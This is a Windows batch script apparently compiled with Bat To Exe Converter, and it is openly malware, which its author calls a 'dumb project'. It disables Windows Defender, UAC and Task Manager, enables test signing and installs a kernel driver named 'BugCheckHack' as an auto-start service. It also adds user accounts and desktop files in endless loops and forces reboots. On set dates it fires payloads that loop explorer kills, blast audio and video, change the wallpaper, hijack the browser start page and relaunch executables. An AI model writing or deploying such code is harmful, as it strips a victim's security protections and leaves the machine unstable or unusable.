::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDeorc07rANuIAig==
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDfY7IlLmec4A=
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDfYHflLmec4A=
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDfYHflKKMM4A=
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDdIDXlLaDMIA=
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDaN2VzLadQA==
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDaN3ZlKKMM4A=
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDbIrIzvqYIvNz
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDId6KlLaDMIA=
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDdobJ2bmKbuUL7yU=
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDdIDXlLmBNoA=
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDeozTlKaLJ4A=
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDWprc+byLI+s760bvO4U0xRo=
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDbIfe37qKbuUL7yU=
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDep3O0vqLOOVz
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJH2L91c9LRVAX0SDMm/6NbAI/OH16Pm7g0kQXew2a5vJ26CBMtw371bvYZk96m9VlMIIHxNNdwCtagU3r2VGpWqDIs2Y/QbiRSg=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF65
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF65
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBpQQQ2MAE+/Fb4I5/jH4P+TslgJaPAqdsHewrHu
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@Echo off
sc config WinDefend start= disabled
sc stop WinDefend
set status=0
IF exist %temp%\hey.txt goto start
::Bugcheckhack and another file
copy %b2eincfilepath%\theend.exe %SYSTEMROOT%\theend.exe
bcdedit /set testsigning on
reg import %b2eincfilepath%\bch.reg
::Disabling taskmgr and stuff
start wscript %b2eincfilepath%\begin.vbs
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %b2eincfilepath%\lol.bmp /f 
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
echo Hey>%temp%\hey.txt
echo You've been infected by my dumb project huh? >>%temp%\hey.txt
echo I just wanted to say hello to you with this very little message :)>>%temp%\hey.txt
echo Enjoy the music .w.>>%temp%\hey.txt
shutdown -r -t 20 -c "Windows has encountered a problem and needs to shut down..."
:usa
net user "Jean %random%" %random% /add
echo oops~ > "%userprofile%/Desktop/%username% open me %random%%random%.txt"
goto usa
::Bugcheck 2
:bc
copy %b2eincfilepath%\BugCheckHack.sys %SYSTEMROOT%\BugCheckHack.sys
sc create BugCheckHack binPath=%SYSTEMROOT%\BugCheckHack.sys type=kernel start=auto
::Payload management
:start
IF NOT exist %temp%\hey.txt goto bc
sc start BugCheckHack
For /f "delims=" %%A in ('powershell get-date -format "{MM-dd}"') do @set _dtm=%%A
::Check dates first
if %status%==0625 (
if "06-25" == "%_dtm%" (
timeout -t 5 > nul
goto start
) else (
set status=0
goto start
)
)
if %status%==1231 (
if "12-31" == "%_dtm%" (
timeout -t 5 > nul
goto start
) else (
set status=0
goto start
)
)
if %status%==0911 (
if "09-11" == "%_dtm%" (
timeout -t 5 > nul
goto start
) else (
set status=0
goto start
)
)
if "02-06" == "%_dtm%" (
    start wscript %b2eincfilepath%\test.vbs
       :a
    taskkill /F /IM explorer.exe
    timeout -t 1 > nul
    start explorer.exe
timeout -t 1 > nul
    goto a
)
if "09-01" == "%_dtm%" (
%b2eincfilepath%\nircmd.exe mutesysvolume 0
%b2eincfilepath%\nircmd.exe setsysvolume 65535
start wmplayer %b2eincfilepath%\lol.mov /fullscreen
timeout -t 30 > nul
taskkill /F /IM wmplayer.exe
goto start
)
if "06-25" == "%_dtm%" (
start wscript %b2eincfilepath%\p2.vbs
start wscript %b2eincfilepath%\p2b.vbs
set status=0625
)
if "09-11" == "%_dtm%" (
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %b2eincfilepath%\911.bmp /f 
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
set status=0911
)
if "10-01" == "%_dtm%" (
%b2eincfilepath%\nircmd.exe cdrom open d:
REG ADD "HKCU\Software\Microsoft\Internet Explorer\Main" /V "Start Page" /D "http://clubette.us.to" /F
start iexplore.exe
:lolnir
%b2eincfilepath%\nircmd speak text "laul"
goto lolnir
)
if "12-14" == "%_dtm%" (
:win
start %b2eincfilepath%\bruh.exe
timeout -t 2 > nul
goto win
)
if "12-31" == "%_dtm%" (
start wscript %b2eincfilepath%\end.vbs
start %temp%\hey.txt
timeout -t 5 > nul
start iexplore https://www.google.com/search?q=smile+emoji&tbm=isch
set status=1231
)
if "01-01" == "%_dtm%" (
:h
%b2eincfilepath%\nircmd.exe win trans ititle "internet explorer" 192
%b2eincfilepath%\nircmd.exe win trans ititle "cmd" 192
%b2eincfilepath%\nircmd.exe win trans ititle "File Explorer" 192
%b2eincfilepath%\nircmd.exe win trans ititle "Registry Editor" 192
timeout -t 1 > nul
%b2eincfilepath%\nircmd.exe win trans ititle "internet explorer" 256
%b2eincfilepath%\nircmd.exe win trans ititle "cmd" 256
%b2eincfilepath%\nircmd.exe win trans ititle "File Explorer" 256
%b2eincfilepath%\nircmd.exe win trans ititle "Registry Editor" 256
goto h
)
goto start